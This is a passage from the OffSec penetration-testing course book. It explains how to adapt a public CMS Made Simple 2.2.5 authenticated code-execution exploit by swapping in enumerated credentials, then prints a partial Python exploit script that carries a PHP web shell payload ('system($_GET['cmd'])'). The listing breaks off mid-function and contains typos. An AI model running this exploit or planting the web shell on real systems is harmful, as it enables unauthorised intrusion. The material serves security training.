# OffSec

Penetration Testing with Kali Linux

Finally, we also need to change the credentials used in the original exploit to match those found during the enumeration process. These are defined in the username and password variables at lines 15 and 16, respectively.

```
username = "admin"
password = "password"
```

Listing 338 - username and password variables as defined in the original exploit

We can easily replace these credentials.

```
username = "admin"
password = "HUYfaw763"
```

Listing 339 - username and password variables updated to match our scenario

In this case, we do not need to update the simple payload since it only executes commands in clear text within the GET request.

After all edits are complete, the final exploit should appear as follows:

```
# Exploit Title: CMS Made Simple 2.2.5 authenticated Code Execution
# Date: 03 of July, 2018
# Exploit Author: Mustafa Hasan (@strukt93)
# Vendor Homepage: http://www.cmmsadesimple.org/
# Software Link: http://www.cmmsadesimple.org/downloads/cmsms/
# Version: 2.2.5
# CVE: CVE-2018-100894

import requests
import base64

base_url = "https://10.11.0.128/admin"
upload_dir = "/uploads"
upload_url = base_url.split('/admin/')[0] + upload_dir
username = "admin"
password = "HUYfaw763"

csrf_param = "_"
txt_filename = "cmmsrce.txt"
php_filename = ".shell.php"
payload = "<?php system(\$_GET['cmd']);?>"

def parse_csrf_token(location):
    return location.split(csrf_param + "=")[1]

def authenticate():
    page = "/login.php"
    url = base_url + page
    data = {
        "username": username,
        "password": password,
        "loginsubmit": "Submit"
    }
    response = requests.post(url, data=data, allow_redirects=False, verify=False)
    status_code = response.status_code
    if status_code == 302:
        print("[[Authenticated successfully with the supplied credentials]\")"
```

PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.

447